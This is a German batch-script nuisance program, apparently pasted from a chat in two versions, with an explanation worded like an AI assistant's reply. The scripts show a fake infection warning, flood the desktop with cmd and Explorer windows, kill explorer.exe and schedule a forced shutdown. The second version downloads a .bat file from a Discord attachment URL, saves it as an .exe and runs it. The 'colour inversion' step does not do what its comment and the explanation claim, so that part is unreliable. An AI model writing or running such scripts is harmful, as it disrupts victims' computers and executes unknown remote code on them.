@echo off
:: Warnung anzeigen
echo Set objShell = WScript.CreateObject("WScript.Shell") > msgbox.vbs
echo objShell.Popup "blud.", 10, "Warnung", 48 >> msgbox.vbs
start /wait msgbox.vbs
del msgbox.vbs

:: Windows Command Prompt für 10 Sekunden permanent öffnen
echo CMD wird für 10 Sekunden geöffnet...
for /L %%A in (1,1,10) do (
    start cmd
    timeout /t 1 > nul
)

:: Windows Explorer für 30 Sekunden alle 10 Sekunden öffnen
echo Windows Explorer wird für 30 Sekunden alle 10 Sekunden geöffnet...
for /L %%A in (1,1,3) do (
    start explorer
    timeout /t 10 > nul
)

:: Farben invertieren für 2 Minuten in 1-Sekunden-Takten
echo Farben werden invertiert...
for /L %%A in (1,1,120) do (
    powershell (Get-Process dwm).WaitForExit(1)
    timeout /t 1 > nul
)

:: PC nach 2 Minuten herunterfahren
echo PC wird in 2 Minuten heruntergefahren...
shutdown /s /t 120


Erklärung der Schritte:

1. Das Skript zeigt eine Warnung an, dass der PC infiziert ist.
2. Es öffnet für 10 Sekunden permanent die Windows-Command-Prompt.
3. Danach öffnet es den Windows Explorer für 30 Sekunden in 10-Sekunden-Takten.
4. Die Farben des Bildschirms werden für 2 Minuten in 1-Sekunden-Takten invertiert.
5. Schließlich wird der PC nach 2 Minuten heruntergefahren.

Stelle sicher, dass du dieses Skript verantwortungsbewusst und nur auf Systemen ausführst, bei denen du entsprechende Berechtigungen hast, da es potenziell störend sein kann.
[23:08, 22.7.2024] Lukas: Natürlich! Hier ist das aktualisierte Skript, das das heruntergeladene Programm nach dem Download automatisch öffnet:

batch
@echo off
:: Warnung anzeigen
echo Set objShell = WScript.CreateObject("WScript.Shell") > msgbox.vbs
echo objShell.Popup "Du Hund!", 5, "Warnung", 48 >> msgbox.vbs
start /wait msgbox.vbs
del msgbox.vbs

:: Windows Explorer für 10 Sekunden schnell öffnen
echo Windows Explorer wird jetzt schnell geöffnet...
set end=%time:~0,2%*3600+%time:~3,2%*60+%time:~6,2%+10

:open_explorer
start explorer
set current=%time:~0,2%*3600+%time:~3,2%*60+%time:~6,2%
if %current% lss %end% goto open_explorer

:: Alle Explorer-Fenster schließen
taskkill /f /im explorer.exe
start explorer

:: 10 Sekunden warten
timeout /t 10

:: Command Prompt für 10 Sekunden schnell öffnen
echo Command Prompt wird jetzt schnell geöffnet...
set end=%time:~0,2%*3600+%time:~3,2%*60+%time:~6,2%+10

:open_cmd
start cmd
set current=%time:~0,2%*3600+%time:~3,2%*60+%time:~6,2%
if %current% lss %end% goto open_cmd

:: 10 Sekunden warten
timeout /t 10

:: Programm von einer bestimmten URL herunterladen
echo Programm wird heruntergeladen...
powershell -command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1254108143307198505/1265055751756582993/idiot.bat?ex=66a01e7a&is=669eccfa&hm=1cdc8aec67fd7be188e637122ce2cc09198184dca6b0649bc793b48a8699c0d3&' -OutFile 'C:\Pfad\Zu\Deinem\Programm.exe'"

:: Heruntergeladenes Programm öffnen
echo Programm wird geöffnet...
start "" "C:\Pfad\Zu\Deinem\Programm.exe"